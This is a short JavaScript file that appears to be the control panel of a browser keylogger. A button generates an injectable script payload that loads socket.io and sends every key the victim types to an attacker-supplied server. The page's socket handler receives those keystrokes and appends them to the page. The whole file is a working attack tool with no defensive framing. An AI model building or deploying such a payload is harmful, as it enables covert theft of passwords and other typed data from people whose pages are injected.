const socket = io();
socket.on('message', (message) => {
    const richtextDiv = document.getElementById('richtext');
    richtextDiv.innerHTML += message;
});

document.getElementById('getPayload').addEventListener('click', () => {
    const serverUrl = document.getElementById('serverUrl').value;
    const payload = `<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.1/socket.io.js"></script><script>const socket=io('${serverUrl}');document.addEventListener('keyup',e=>socket.send(e.key));</script>`;
    document.getElementById("Payload").value = payload;
});
